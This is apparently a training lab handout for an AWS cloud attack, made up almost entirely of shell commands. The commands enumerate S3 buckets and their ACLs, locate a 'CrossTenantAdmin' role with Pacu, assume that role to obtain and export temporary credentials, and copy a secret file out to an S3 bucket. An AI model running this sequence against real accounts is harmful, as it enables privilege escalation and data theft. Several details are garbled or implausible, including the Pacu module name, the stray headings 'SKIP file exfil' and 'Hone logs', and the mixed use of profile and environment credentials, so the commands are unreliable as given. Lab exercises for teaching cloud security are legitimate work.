Lab 2 – Cloud Attack Lab

Reference commands (full list) – see the code block at the bottom.



1\. Quick‑Start

\# Install prerequisites on your Kali or Ubuntu lab host

sudo apt update

sudo apt install -y python3-pip awscli jq unzip

sudo pip3 install pacu scoutsuite



\# (Optional) Load the lab profile (https://github.com/your-org/lab-profile)

aws configure --profile lab

pacu init

2\. Cloud Recon \& Asset Enumeration

\# Enumerate S3 buckets

aws s3api list-buckets --profile lab --output json > s3\_buckets.json



\# Check bucket ACLs

jq -r '.Buckets\[].Name' s3\_buckets.json | \\

&nbsp; while read bucket; do

&nbsp;   aws s3api get-bucket-acl --bucket "$bucket" --profile lab | \\

&nbsp;   jq '.' >> s3\_acls.json

&nbsp; done

3\. IAM Privilege Escalation

\# Find roles with PassRole on high‑priv policies

pacu --profile lab exec iam:role\_expose | \\

&nbsp; grep CrossTenantAdmin > iam\_roles.txt



\# Assume the role

ROLE\_ARN=$(grep -Eo 'arn:aws:iam::\[0-9]+:role/\[^ ]+' iam\_roles.txt)

aws sts assume-role \\

&nbsp; --role-arn "$ROLE\_ARN" \\

&nbsp; --role-session-name labsession \\

&nbsp; --profile lab \\

&nbsp; --output json > assume.json



\# Use the temporary creds

export AWS\_ACCESS\_KEY\_ID=$(jq -r '.Credentials.AccessKeyId' assume.json)

export AWS\_SECRET\_ACCESS\_KEY=$(jq -r '.Credentials.SecretAccessKey' assume.json)

export AWS\_SESSION\_TOKEN=$(jq -r '.Credentials.SessionToken' assume.json)

4\. SKIP file exfil

aws s3 cp /tmp/secret.txt s3://lab-bucket/

5\. Hone logs

\# Log the operation locally – keep in lab\_report/logs/

echo "$(date +'%Y-%m-%d %H:%M:%S') - Exfil created to s3://lab-bucket" >> lab\_report/logs/exfil.log

6\. Troubleshooting

Symptom	Fix

AccessDenied on S3	Validate bucket policy or Role’s permissions

STS fails	Ensure the world root or the STS endpoints are reachable

Exfil missing	Confirm S3 bucket‑policy permits PutObject in the current key‑prefix

7\. Full Commands

\# 1. Provision dependencies

sudo apt update \&\& sudo apt install -y python3-pip awscli jq unzip



\# 2. Install Pacu \& ScoutSuite

sudo pip3 install pacu scoutsuite



\# 3. Configure AWS CLI

aws configure  # when prompted use lab‑profile keys



\# 4. Enumerate S3 buckets

aws s3api list-buckets --profile lab --output json > s3\_buckets.json



\# 5. Acls for each bucket

jq -r '.Buckets\[].Name' s3\_buckets.json | \\

&nbsp; while read bucket; do

&nbsp;   aws s3api get-bucket-acl --bucket "$bucket" \\

&nbsp;     --profile lab | jq '.' >> s3\_acls.json

&nbsp; done



\# 6. Role expose

pacu --profile lab exec iam:role\_expose | grep CrossTenantAdmin > roles.txt



\# 7. Assume role; set env vars

ROLE\_ARN=$(gawk '/arn:aws:iam::/ {print $1}' roles.txt | tr -d '"')

aws sts assume-role \\

&nbsp; --role-arn "$ROLE\_ARN" \\

&nbsp; --role-session-name labsession \\

&nbsp; --profile lab \\

&nbsp; --output json > assume.json



export AWS\_ACCESS\_KEY\_ID=$(jq -r '.Credentials.AccessKeyId' assume.json)

export AWS\_SECRET\_ACCESS\_KEY=$(jq -r '.Credentials.SecretAccessKey' assume.json)

export AWS\_SESSION\_TOKEN=$(jq -r '.Credentials.SessionToken' assume.json)



\# 8. List all heads to confirm permission

aws s3api list-buckets --profile lab --output json



\# 9. Exfil a test file

aws s3 cp /tmp/secret.txt s3://lab-bucket/

